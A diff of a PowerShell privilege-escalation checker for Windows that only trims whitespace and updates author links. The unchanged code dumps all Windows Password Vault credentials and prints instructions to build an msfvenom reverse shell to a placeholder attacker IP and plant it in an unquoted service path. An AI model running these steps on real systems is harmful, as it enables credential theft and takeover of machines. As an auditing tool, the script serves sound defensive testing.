@@ -1,5 +1,5 @@
 <#
-.SYNOPSIS 
+.SYNOPSIS
 This cmdlet is meant to check whether the AlwaysInstallEleveated permissions are enabled on a Windows Machine  which opens the door to privesc. It checks common registry locations for clear text credentials. It checks for weak service permissions. This checks for WSUS using HTTP to download updates which can be exploited for privilege escalation. This checks whether the fodhelper bypass method is available for admin users. This checks for unquoted service paths in the reigstry as well.
 
 
@@ -7,10 +7,10 @@ This cmdlet is meant to check whether the AlwaysInstallEleveated permissions are
 AlwaysInstallElevated is functionality that offers all users(especially the low privileged user) on a windows machine to run any MSI file with elevated privileges. MSI is a Microsoft based installer package file format which is used for installing, storing and removing of a program. When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is).
 
 
-.EXAMPLE 
+.EXAMPLE
 Test-PrivEsc -Verbose
-# This example performs a check for common privilege escalation methods. 
-    
+# This example performs a check for common privilege escalation methods.
+
 
 .NOTES
 Author: Robert H. Osborne
@@ -20,20 +20,20 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
-    
+
 
 .INPUTS
 None
-    
-    
+
+
 .OUTPUTS
 None
 #>
@@ -81,10 +81,10 @@ Function Test-PrivEsc {
 
                 Get-Content -Path $PassFile | Select-String -Pattern "Password"
 
-            }  # End If 
+            }  # End If
 
-        }  # End ForEach 
-        
+        }  # End ForEach
+
         Write-Verbose "Checking for passwords in the Windows Password vault"
         [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }
 
@@ -165,7 +165,7 @@ Function Test-PrivEsc {
 
             Write-Host "Unquoted Service Path has been found" -ForegroundColor "Red"
 
-            $UnquotedServicePaths | Select-Object -Property PathName,DisplayName,Name | Format-List -GroupBy Name 
+            $UnquotedServicePaths | Select-Object -Property PathName,DisplayName,Name | Format-List -GroupBy Name
 
             Write-Host "Create a reverse shell using the following command`n`nmsfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=1337 -f exe -o msf.exe" -ForegroundColor "Yellow"
             Write-Host "Place the generated payload msf.exe into the unquoted service path location and restart the service." -ForegroundColor "Yellow"
@@ -208,9 +208,9 @@ Function Test-PrivEsc {
             Write-Host "This device is not vulnerable to the fodhelper UAC bypass method. `nUAC Settings: $Message" -ForegroundColor "Green"
 
         }  # End If
-        Else 
+        Else
         {
-            
+
             Write-Host "This device is vulnerable to the fodhelper bypass method. `nCurrent UAC Settings: $Message" -ForegroundColor "Yellow"
 
         }  # End Else
